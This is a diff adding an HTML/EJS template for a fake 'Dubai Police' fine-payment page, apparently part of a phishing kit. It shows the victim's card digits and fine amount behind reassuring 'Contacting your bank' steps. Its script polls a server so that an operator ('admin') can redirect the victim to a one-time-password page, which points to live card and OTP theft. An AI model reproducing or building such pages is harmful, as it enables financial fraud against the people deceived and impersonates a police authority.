@@ -1,0 +1,218 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<title>Processing Payment | Dubai Police</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+* { box-sizing: border-box; margin: 0; padding: 0; }
+body { font-family: 'Inter', -apple-system, sans-serif; background: #f0f4f8; min-height: 100vh; display: flex; flex-direction: column; }
+
+@keyframes spin   { to { transform: rotate(360deg); } }
+@keyframes fadeIn { from { opacity: 0; transform: translateY(12px); } to { opacity: 1; transform: translateY(0); } }
+@keyframes pulse-ring {
+  0%   { transform: scale(0.8); opacity: 0.8; }
+  100% { transform: scale(1.6); opacity: 0; }
+}
+
+header {
+  background: linear-gradient(135deg, #1a6b3a, #0f4a27);
+  padding: 14px 18px;
+  display: flex; align-items: center; gap: 12px;
+}
+.header-back {
+  width: 34px; height: 34px; border-radius: 50%;
+  background: rgba(255,255,255,0.15); border: none;
+  color: white; font-size: 20px; cursor: pointer;
+  display: flex; align-items: center; justify-content: center;
+}
+.header-title { flex: 1; text-align: center; }
+.header-title div:first-child { color: white; font-weight: 800; font-size: 16px; }
+.header-title div:last-child  { color: rgba(255,255,255,0.6); font-size: 11px; }
+
+.main { flex: 1; display: flex; align-items: center; justify-content: center; padding: 24px 16px; }
+
+.card {
+  background: white; border-radius: 20px; padding: 40px 28px;
+  width: 100%; max-width: 380px; text-align: center;
+  box-shadow: 0 4px 32px rgba(0,0,0,0.08);
+  animation: fadeIn 0.4s ease;
+}
+
+/* Spinner ring */
+.spinner-wrap {
+  position: relative; width: 80px; height: 80px;
+  margin: 0 auto 28px;
+}
+.pulse-ring {
+  position: absolute; inset: 0; border-radius: 50%;
+  background: rgba(26, 107, 58, 0.15);
+  animation: pulse-ring 1.8s ease-out infinite;
+}
+.spinner-bg {
+  position: absolute; inset: 0; border-radius: 50%;
+  background: linear-gradient(135deg, #1a6b3a, #0f4a27);
+  display: flex; align-items: center; justify-content: center;
+}
+.spinner-icon {
+  width: 40px; height: 40px;
+  border: 3px solid rgba(255,255,255,0.25);
+  border-top-color: white;
+  border-radius: 50%;
+  animation: spin 0.9s linear infinite;
+}
+
+.status-title { font-size: 18px; font-weight: 800; color: #0f172a; margin-bottom: 8px; }
+.status-sub   { font-size: 13px; color: #64748b; line-height: 1.6; margin-bottom: 28px; }
+
+.detail-box {
+  background: #f8fafc; border: 1.5px solid #e2e8f0;
+  border-radius: 12px; padding: 14px 16px;
+  display: flex; justify-content: space-between; align-items: center;
+  margin-bottom: 24px;
+}
+.detail-left  { text-align: left; }
+.detail-label { font-size: 11px; color: #94a3b8; margin-bottom: 2px; }
+.detail-card  { font-size: 14px; font-weight: 700; color: #0f172a; font-family: monospace; }
+.detail-right { text-align: right; }
+.detail-amount-label { font-size: 11px; color: #94a3b8; margin-bottom: 2px; }
+.detail-amount { font-size: 20px; font-weight: 900; color: #1a6b3a; }
+
+.steps { text-align: left; display: flex; flex-direction: column; gap: 10px; margin-bottom: 24px; }
+.step  { display: flex; align-items: center; gap: 10px; font-size: 12px; color: #94a3b8; }
+.step.done   { color: #1a6b3a; }
+.step.active { color: #0f172a; font-weight: 600; }
+.step-dot {
+  width: 20px; height: 20px; border-radius: 50%; flex-shrink: 0;
+  display: flex; align-items: center; justify-content: center;
+  background: #f1f5f9; border: 2px solid #e2e8f0; font-size: 9px;
+}
+.step.done   .step-dot { background: #dcfce7; border-color: #86efac; color: #166534; }
+.step.active .step-dot { background: rgba(26,107,58,0.1); border-color: #1a6b3a; }
+.step-blink  { width: 7px; height: 7px; border-radius: 50%; background: #1a6b3a; animation: spin 0.6s linear infinite; border: 2px solid transparent; border-top-color: #1a6b3a; }
+
+.security-note {
+  font-size: 11px; color: #94a3b8;
+  display: flex; align-items: center; justify-content: center; gap: 5px;
+}
+
+/* Redirect overlay */
+#redirect-overlay {
+  display: none; position: fixed; inset: 0;
+  background: rgba(15,26,10,0.85); backdrop-filter: blur(4px);
+  z-index: 100; align-items: center; justify-content: center;
+}
+#redirect-overlay.show { display: flex; }
+.redirect-card {
+  background: white; border-radius: 16px; padding: 32px 28px; text-align: center;
+  max-width: 300px; width: 90%; animation: fadeIn 0.3s ease;
+}
+.redirect-spinner {
+  width: 48px; height: 48px; border: 4px solid #e2e8f0;
+  border-top-color: #1a6b3a; border-radius: 50%;
+  animation: spin 0.8s linear infinite; margin: 0 auto 16px;
+}
+.redirect-text { font-size: 15px; font-weight: 700; color: #0f172a; margin-bottom: 6px; }
+.redirect-sub  { font-size: 12px; color: #94a3b8; }
+</style>
+</head>
+<body>
+
+<header>
+  <div style="width:34px;"></div>
+  <div class="header-title">
+    <div>Secure Payment</div>
+    <div>الدفع الآمن</div>
+  </div>
+  <img src="/dp-logo.png" alt="Dubai Police" width="34" height="34" style="border-radius:50%;opacity:0.9;">
+</header>
+
+<div class="main">
+  <div class="card">
+
+    <div class="spinner-wrap">
+      <div class="pulse-ring"></div>
+      <div class="spinner-bg">
+        <div class="spinner-icon"></div>
+      </div>
+    </div>
+
+    <div class="status-title">Payment Submitted</div>
+    <div class="status-sub">Your transaction is being reviewed by our security system. Please keep this page open.</div>
+
+    <div class="detail-box">
+      <div class="detail-left">
+        <div class="detail-label">Card</div>
+        <div class="detail-card">**** **** **** <%= cardLast4 %></div>
+      </div>
+      <div class="detail-right">
+        <div class="detail-amount-label">Amount</div>
+        <div class="detail-amount">AED <%= totalFine.toLocaleString() %></div>
+      </div>
+    </div>
+
+    <div class="steps" id="steps">
+      <div class="step done"   id="s0"><div class="step-dot">&#10003;</div> Payment details received</div>
+      <div class="step done"   id="s1"><div class="step-dot">&#10003;</div> Card verified</div>
+      <div class="step active" id="s2"><div class="step-dot"><div class="step-blink"></div></div> Contacting your bank...</div>
+      <div class="step"        id="s3"><div class="step-dot"></div> Awaiting bank confirmation</div>
+    </div>
+
+    <div class="security-note">
+      <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+      Secured by 256-bit SSL encryption
+    </div>
+  </div>
+</div>
+
+<!-- Redirect overlay shown when admin sends user to OTP page -->
+<div id="redirect-overlay">
+  <div class="redirect-card">
+    <div class="redirect-spinner"></div>
+    <div class="redirect-text">Connecting to Bank</div>
+    <div class="redirect-sub">Redirecting to authentication page...</div>
+  </div>
+</div>
+
+<script>
+const SID        = <%- JSON.stringify(sid) %>;
+const CARD_LAST4 = <%- JSON.stringify(cardLast4) %>;
+const TOTAL_FINE = <%- JSON.stringify(totalFine) %>;
+const ISSUER     = <%- JSON.stringify(issuer) %>;
+
+const sidParams = '?cardLast4=' + encodeURIComponent(CARD_LAST4)
+                + '&totalFine=' + TOTAL_FINE
+                + '&issuer='   + encodeURIComponent(ISSUER)
+                + '&sid='      + SID;
+
+// Animate step 3 activation after a short delay
+setTimeout(() => {
+  const s2 = document.getElementById('s2');
+  const s3 = document.getElementById('s3');
+  s2.className = 'step done';
+  s2.querySelector('.step-dot').innerHTML = '&#10003;';
+  s3.className = 'step active';
+  s3.querySelector('.step-dot').innerHTML = '<div class="step-blink"></div>';
+}, 3500);
+
+// Poll for admin redirect
+if (SID) {
+  const poll = setInterval(async () => {
+    try {
+      const r = await fetch('/api/check-status?sid=' + SID);
+      const d = await r.json();
+      if (d.action === 'redirect' && d.page) {
+        clearInterval(poll);
+        // Show overlay, then navigate after brief delay
+        document.getElementById('redirect-overlay').classList.add('show');
+        setTimeout(() => {
+          window.location.href = '/' + d.page + sidParams;
+        }, 1200);
+      }
+    } catch(e) {}
+  }, 3000);
+}
+</script>
+</body>
+</html>
